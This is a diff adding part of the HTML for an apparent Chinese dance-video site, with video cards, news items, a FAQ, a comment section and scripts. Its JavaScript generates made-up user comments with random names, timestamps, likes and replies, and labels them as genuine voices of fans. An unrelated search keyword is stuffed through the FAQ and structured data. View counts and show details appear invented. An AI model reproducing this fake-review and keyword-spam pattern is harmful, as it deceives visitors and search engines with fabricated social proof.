+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#10B981,#22D3EE)">
+                        <div class="cat-label">✨ 现代舞</div>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">09:15</span>
+                    </div>
+                    <div class="video-info">
+                        <h3 class="video-title">现代舞《追光者》幕后纪实</h3>
+                        <p class="video-desc">记录舞者们日复一日的训练日常，那些汗水与泪水交织的追梦时刻。</p>
+                        <div class="video-meta"><span>▷ 452万播放</span><span>♥ 9.2万赞</span></div>
+                        <div class="tag-group"><span class="tag-video">催泪</span><span class="tag">纪实</span></div>
+                    </div>
+                </div>
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#F43F5E,#FB923C)">
+                        <div class="cat-label">💃 拉丁舞</div>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">05:30</span>
+                    </div>
+                    <div class="video-info">
+                        <h3 class="video-title">拉丁舞锦标赛冠军表演</h3>
+                        <p class="video-desc">恰恰+伦巴双料冠军现场秀，热烈奔放的舞步与音乐完美契合，视听双重享受。</p>
+                        <div class="video-meta"><span>▷ 634万播放</span><span>♥ 15.7万赞</span></div>
+                        <div class="tag-group"><span class="tag-video">冠军</span><span class="tag">拉丁</span></div>
+                    </div>
+                </div>
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#8B5CF6,#EC4899)">
+                        <div class="cat-label">🩰 芭蕾</div>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">10:06</span>
+                    </div>
+                    <div class="video-info">
+                        <h3 class="video-title">《天鹅湖》经典三幕选段</h3>
+                        <p class="video-desc">百年经典芭蕾重现舞台，优雅天鹅与王子共舞，艺术与美学的极致表达。</p>
+                        <div class="video-meta"><span>▷ 892万播放</span><span>♥ 24.1万赞</span></div>
+                        <div class="tag-group"><span class="tag-video">经典</span><span class="tag">芭蕾</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- 相关资讯 -->
+    <section id="section-news">
+        <div class="container">
+            <div class="section-title"><h2>相关资讯</h2></div>
+            <p class="section-sub">舞蹈行业动态与精彩幕后</p>
+            <div class="divider-line"></div>
+            <div class="news-grid">
+                <div class="news-card">
+                    <span class="news-date">2026-02-08</span>
+                    <h3 class="news-title">舞蹈综艺新玩法引发热议：赛制革新带来哪些惊喜？</h3>
+                    <p class="news-excerpt">今年舞蹈综艺在赛制上大胆创新，引入盲选搭档与跨舞种融合赛制，观众好评如潮。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <span class="news-date">2026-02-05</span>
+                    <h3 class="news-title">街舞大赛冠军专访：从街头到舞台的十年坚守</h3>
+                    <p class="news-excerpt">冠军舞者阿K分享从地下battle到万人舞台的心路历程，讲述那些不为人知的坚持。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <span class="news-date">2026-01-28</span>
+                    <h3 class="news-title">古典舞融入现代元素，传统艺术焕发全新生机</h3>
+                    <p class="news-excerpt">多位青年舞蹈家尝试将传统古典舞与现代光影技术结合，让千年韵味穿屏而出。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <span class="news-date">2026-01-20</span>
+                    <h3 class="news-title">舞台灯光技术迎来革命性突破，舞蹈演出效果大幅提升</h3>
+                    <p class="news-excerpt">最新智能灯光系统可实时追踪舞者动作，自动调节氛围光影，打造沉浸式舞台。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <span class="news-date">2026-01-15</span>
+                    <h3 class="news-title">舞蹈演员幕后训练日常曝光：每天12小时的汗水</h3>
+                    <p class="news-excerpt">跟拍舞蹈演员高强度训练日常，从清晨早功到深夜排练，每一滴汗水都是热爱的证明。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <span class="news-date">2026-01-10</span>
+                    <h3 class="news-title">舞蹈培训机构新趋势：线上+线下融合教学成主流</h3>
+                    <p class="news-excerpt">后疫情时代，舞蹈培训行业加速数字化转型，线下教学与线上陪练结合成新常态。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- 常见问题 -->
+    <section id="section-faq">
+        <div class="container">
+            <div class="section-title"><h2>常见问题</h2></div>
+            <p class="section-sub">关于三亚免费高清在线观看的疑问，这里都有答案</p>
+            <div class="faq-list">
+                <div class="faq-item open">
+                    <div class="faq-question">
+                        <i class="fas fa-trophy"></i>
+                        <h3>《三亚免费高清在线观看》的节目赛制是怎样的？</h3>
+                        <span class="faq-toggle">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>节目分为海选、导师战队、主题淘汰赛、总决赛四个阶段。</li>
+                            <li>海选由三位导师盲选打分，前50名选手晋级战队选拔。</li>
+                            <li>战队赛每期设定不同舞蹈主题，由导师排兵布阵并亲自指导。</li>
+                            <li>淘汰赛采用末位淘汰制，同时设置一次复活赛增加逆袭机会。</li>
+                            <li>总决赛由专业评委与大众投票共同决出年度总冠军。</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fas fa-star"></i>
+                        <h3>节目中哪个舞台最受观众欢迎？</h3>
+                        <span class="faq-toggle">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>第三期《星火》以民俗融合现代舞的风格点燃全场。</li>
+                            <li>该舞台视频在平台播放量已突破8000万次。</li>
+                            <li>微博相关话题阅读量超过3亿，冲上热搜榜前列。</li>
+                            <li>被多个省级卫视引用为行业节目制作样板。</li>
+                            <li>舞台片段在海外社交平台同样引发广泛传播。</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fas fa-users"></i>
+                        <h3>三亚免费高清在线观看的导师阵容有何看点？</h3>
+                        <span class="faq-toggle">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>三位导师分别代表古典舞、街舞、民族舞三个专业领域。</li>
+                            <li>街舞导师曾获世界街舞锦标赛冠军，实力与名气兼备。</li>
+                            <li>古典舞导师是北京舞蹈学院的资深教授，功底深厚。</li>
+                            <li>民族舞导师擅长将非遗元素融入现代编舞。</li>
+                            <li>导师之间的风格碰撞成为节目一大亮点。</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fas fa-mask"></i>
+                        <h3>节目舞台设计有哪些特别之处？</h3>
+                        <span class="faq-toggle">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>采用270度环绕LED屏，营造沉浸式视觉氛围。</li>
+                            <li>舞台地面嵌入压力感应灯光系统，舞步触发灯光特效。</li>
+                            <li>每期根据舞蹈主题定制舞台机械装置，如旋转舞台、升降台。</li>
+                            <li>首次使用全息投影技术辅助舞蹈叙事。</li>
+                            <li>单期舞台搭建成本是常规综艺节目的三倍以上。</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fas fa-medal"></i>
+                        <h3>三亚免费高清在线观看的冠军如何诞生？</h3>
+                        <span class="faq-toggle">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>总决赛成绩由专业评委评分50%和观众实时投票50%构成。</li>
+                            <li>决赛之夜采用三轮竞演制度，累计得分最高者夺冠。</li>
+                            <li>冠军可获量身定制的舞蹈剧全球巡演资格。</li>
+                            <li>决赛直播最高同时在线观看人数突破500万。</li>
+                            <li>冠军作品同步录制为平台独家经典内容上线。</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fas fa-film"></i>
+                        <h3>节目有哪些幕后冷知识？</h3>
+                        <span class="faq-toggle">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>选手每天平均训练时间超过12小时，体能消耗极大。</li>
+                            <li>医疗组配备了专业运动康复师，全程驻守保障。</li>
+                            <li>部分舞台道具由非遗手工艺人纯手工定制。</li>
+                            <li>导演组曾为了一个三秒空镜头重拍八次。</li>
+                            <li>后勤团队为选手准备了科学搭配的营养餐食。</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- 评论留言 -->
+    <section id="section-comment">
+        <div class="container">
+            <div class="section-title"><h2>用户留言</h2></div>
+            <p class="section-sub">来自舞友们的真实声音</p>
+            <div class="divider-line"></div>
+            <div class="comment-wrap">
+                <div class="comment-form-card">
+                    <input type="text" placeholder="你的昵称" maxlength="20">
+                    <textarea placeholder="写下你对本站剧集、功能的看法与建议..."></textarea>
+                    <button class="comment-submit">↑ 发布留言</button>
+                </div>
+                <div class="comment-list" id="commentList"></div>
+            </div>
+        </div>
+    </section>
+    <!-- 页脚 -->
+    <footer class="site-footer">
+        <div class="container">
+            <p>© 2026 三角洲美舞 · 三亚免费高清在线观看 版权所有</p>
+            <p>本站所有视频均来自网络公开渠道，仅供学习交流使用，请于下载后24小时内删除。</p>
+            <p>如认为内容侵权，请<a href="#">联系我们</a>处理。</p>
+        </div>
+    </footer>
+    <!-- 自定义JavaScript -->
+    <script>
+        // ====== 粒子背景 ======
+        (function() {
+            const canvas = document.getElementById('particles');
+            const ctx = canvas.getContext('2d');
+            let w = canvas.width = window.innerWidth;
+            let h = canvas.height = window.innerHeight;
+            const particles = [];
+            const colors = ['#A78BFA', '#FF6B9D', '#38BDF8', '#FBBF24'];
+            function init() {
+                const len = Math.min(60, Math.floor(w * h / 22000));
+                for (let i = 0; i < len; i++) {
+                    particles.push({
+                        x: Math.random() * w,
+                        y: Math.random() * h,
+                        vx: (Math.random() - .5) * .4,
+                        vy: (Math.random() - .5) * .4,
+                        r: Math.random() * 2.5 + .8,
+                        c: colors[Math.floor(Math.random() * colors.length)]
+                    });
+                }
+            }
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if (p.x < 0 || p.x > w) p.vx *= -1;
+                    if (p.y < 0 || p.y > h) p.vy *= -1;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fillStyle = p.c;
+                    ctx.globalAlpha = .5;
+                    ctx.fill();
+                });
+                ctx.globalAlpha = 1;
+                requestAnimationFrame(draw);
+            }
+            window.addEventListener('resize', () => {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+                particles.length = 0;
+                init();
+            });
+            init();
+            draw();
+        })();
+        // ====== FAQ 手风琴 ======
+        document.querySelectorAll('.faq-item').forEach((item, index) => {
+            if (index !== 0) item.classList.remove('open');
+            const q = item.querySelector('.faq-question');
+            q.addEventListener('click', () => {
+                const isOpen = item.classList.contains('open');
+                document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
+                if (!isOpen) item.classList.add('open');
+            });
+        });
+        // ====== 评论数据生成 ======
+        (function() {
+            const users = ['追风少女', '舞者小K', '爱看剧的猫', '柠檬不酸', '街角遇见舞', '星河入梦', '跳舞的月亮', '好想去看演出',
+                '凌晨三点半', '蜜桃汽水', '理想三旬', '一只小鹿酱', '夏日晚风', '云端漫步', '阿布布布', '芝士奶盖呀',
+                '街舞小钢炮', '花间影', '北岛南城', '南巷清风', '一舞惊鸿', '小满未满', '白桃乌龙', '奶油泡芙',
+                '山风与海', '梨涡浅笑', '墨色青花', '拾光碎片', '野原新之助', '旋转的陀螺', '爱吃草莓的鱼', '旧梦不须记',
+                '春风十里', '半盏流年', '孤舟蓑笠翁', '青柠微凉', '人间四月天', '奶油味夏天', '橘子汽水', '星河滚烫',
+                '折耳根不折', '一口一个小面包', '沉默的螺旋', '大力出奇迹', '小兔子乖乖', '跳动的音符', '云端追梦人', '三十八度六',
+                '蜜糖不甜', '半糖主义'];
+            const tags = ['热议', '理性', '热门', '观点', '精彩', '讨论', '催更', '好评'];
+            const contents = [
+                '这舞蹈太燃了，看完热血沸腾！',
+                '终于找到高清版本了，感动到哭！',
+                '每期都在追，节目质量真的顶。',
+                '喜欢现代舞那段，太有张力了。',
+                '舞者们的表情管理绝绝子！',
+                '这个舞台设计太震撼了吧！',
+                '看了三遍还想再看，太上头了。',
+                '希望多出一些幕后内容，想看排练日常。',
+                '民族舞那期太美了，传统文化yyds！',
+                '冠军实至名归，看哭了！',
+                '从第一集追到现在，一集都没落。',
+                '画面质感太好了，收藏了。',
+                '街舞那场battle看的热血沸腾！',
+                '舞蹈演员们的付出令人敬佩。',
+                '下载都打不开啊，快修复一下！',
+                '手机端观看体验可以再优化一下。',
+                '和之前的版本对比，高清修复很到位。',
+                '喜欢最后的谢幕环节，泪目了。',
+                '弹幕区好欢乐，大家真有才。',
+                '这个系列是我今年追过最好的舞蹈节目。',
+                '配乐选得太绝了，氛围感拉满。',
+                '哪位知道第三期背景音乐叫什么名字？',
+                '导师点评很专业，学到了不少。',
+                '希望加个倍速功能，省时间。',
+                '第一次知道舞蹈还能这么融合，长见识！',
+                '舞台灯光和舞蹈配合的天衣无缝！',
+                '这个节目让我重新爱上了舞蹈。',
+                '能不能出个周边，想买！',
+                '跳拉丁舞的小姐姐太有魅力了！',
+                '看完了想来学跳舞，有推荐机构吗？',
+                '每周就等这个节目下饭，太幸福了。',
+                '画质音效都很棒，深夜观看绝佳。',
+                '建议增加英文字幕，想推荐给外国朋友。',
+                '年度最佳综艺预定，不接受反驳！',
+                '这种高品质舞台请给我多来点！',
+                '有时候镜头转得有点快，能慢点吗？',
+                '复活赛太刺激了，逆转翻盘看的好爽！',
+                '舞蹈和科技的完美结合，太酷了！',
+                '选手们太拼了，受伤还在坚持。',
+                '最喜欢每期的主题立意，很有深度。',
+                '和朋友一起看，讨论得很开心。',
+                '能不能邀请更多国外舞者交流？',
+                '看完想去学习东方舞了！',
+                '剪辑节奏很舒服，没有拖沓感。',
+                '审美太在线了，配色构图都很讲究。',
+                '水下舞蹈那段绝了，特效满分！',
+                '希望平台能上线音频版，通勤路上听。',
+                '作为舞蹈专业学生表示学到了很多！',
+                '这个节目让更多人认识了舞蹈艺术。',
+                '虽然广告有点多，但内容值得！'
+            ];
+            const list = document.getElementById('commentList');
+            if (!list) return;
+            const now = new Date('2026-02-10T20:00:00');
+            const comments = users.map((u, i) => {
+                const days = Math.floor(Math.random() * 30);
+                const hours = Math.floor(Math.random() * 24);
+                const mins = Math.floor(Math.random() * 60);
+                const date = new Date(now - days * 86400000 - hours * 3600000 - mins * 60000);
+                const pad = n => String(n).padStart(2, '0');
+                return {
+                    user: u,
+                    tag: tags[Math.floor(Math.random() * tags.length)],
+                    txt: contents[i % contents.length],
+                    time: `${date.getFullYear()}-${pad(date.getMonth()+1)}-${pad(date.getDate())} ${pad(date.getHours())}:${pad(date.getMinutes())}`,
+                    likes: Math.floor(Math.random() * 1000),
+                    replies: Math.floor(Math.random() * 51)
+                };
+            }).sort((a, b) => b.time.localeCompare(a.time));
+            let html = '';
+            comments.slice(0, 12).forEach(c => {
+                const avatarChar = c.user.charAt(0);
+                html += `
+                <div class="comment-item">
+                    <div class="comment-head">
+                        <div class="comment-user">
+                            <span class="comment-avatar">${avatarChar}</span>
+                            <span class="comment-username">${c.user}</span>
+                        </div>
+                        <span class="comment-time">${c.time}</span>
+                    </div>
+                    <span class="comment-tag">${c.tag}</span>
+                    <div class="comment-text">${c.txt}</div>
+                    <div class="comment-actions">
+                        <span class="btn-like">♥ ${c.likes}</span>
+                        <span class="btn-reply">回复 ${c.replies}</span>
+                    </div>
+                </div>`;
+            });
+            html += `<div class="load-more">向下滑动查看更多留言 ↓</div>`;
+            list.innerHTML = html;
+        })();
+    </script>
+    <!-- 结构化数据：FAQPage + VideoObject + Article -->
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@graph": [{
+                "@type": "FAQPage",
+                "mainEntity": [{
+                    "@type": "Question",
+                    "name": "《三亚免费高清在线观看》的节目赛制是怎样的？",
+                    "acceptedAnswer": { "@type": "Answer", "text": "分为海选、导师战队、主题淘汰赛、总决赛四个阶段。海选由三位导师盲选打分，前50名晋级；战队赛每期设定主题，由导师排兵布阵；淘汰赛采用末位淘汰+复活赛机制；总决赛由专业评委与大众投票决出冠军。" }
+                }, {
+                    "@type": "Question",
+                    "name": "节目中最受欢迎的舞台是哪个？",
+                    "acceptedAnswer": { "@type": "Answer", "text": "第三期《星火》以民俗与现代舞融合最为出圈，播放量突破8000万次，微博话题阅读量超3亿，被多个卫视引用为节目制作样板。" }
+                }, {
+                    "@type": "Question",
+                    "name": "节目导师阵容有何看点？",
+                    "acceptedAnswer": { "@type": "Answer", "text": "三位导师分别代表古典舞、街舞、民族舞领域，其中街舞导师为世界冠军，古典舞导师来自北京舞蹈学院，民族舞导师擅长非遗元素融入。" }
+                }, {
+                    "@type": "Question",
+                    "name": "节目舞台设计有哪些特别之处？",
+                    "acceptedAnswer": { "@type": "Answer", "text": "采用270度环绕LED屏、地面压力感应灯光系统、全息投影技术，每期定制舞台机械装置，搭建成本超常规节目三倍。" }
+                }, {
+                    "@type": "Question",
+                    "name": "冠军如何诞生？",
+                    "acceptedAnswer": { "@type": "Answer", "text": "总决赛专业评委50%+观众实时投票50%，三轮竞演累计得分最高者夺冠，冠军获得定制舞蹈剧全球巡演资格。" }
+                }, {
+                    "@type": "Question",
+                    "name": "节目有哪些幕后冷知识？",
+                    "acceptedAnswer": { "@type": "Answer", "text": "选手每天训练超12小时，医疗组配有康复师，部分道具由非遗手工艺人定制，导演组曾为一个三秒空镜头重拍八次。" }
+                }]
+            }, {
+                "@type": "VideoObject",
+                "name": "三亚免费高清在线观看精选舞蹈视频",
+                "description": "汇聚古典舞、现代舞、街舞、民族舞等经典舞蹈名场面，高清画质完整呈现。",
+                "thumbnailUrl": "/images/dance-poster.jpg",
+                "uploadDate": "2026-01-15",
+                "contentUrl": "/video/dance-collection.mp4"
+            }, {
+                "@type": "Article",
+                "headline": "三亚免费高清在线观看：舞蹈艺术的视觉盛宴",
+                "description": "收录全球舞蹈竞技节目经典名场面，涵盖多种舞蹈风格，高清修复还原舞台细节。",
+                "datePublished": "2026-01-10",
+                "dateModified": "2026-02-08"
+            }]
+        }
+    </script>
+</body>
+</html>
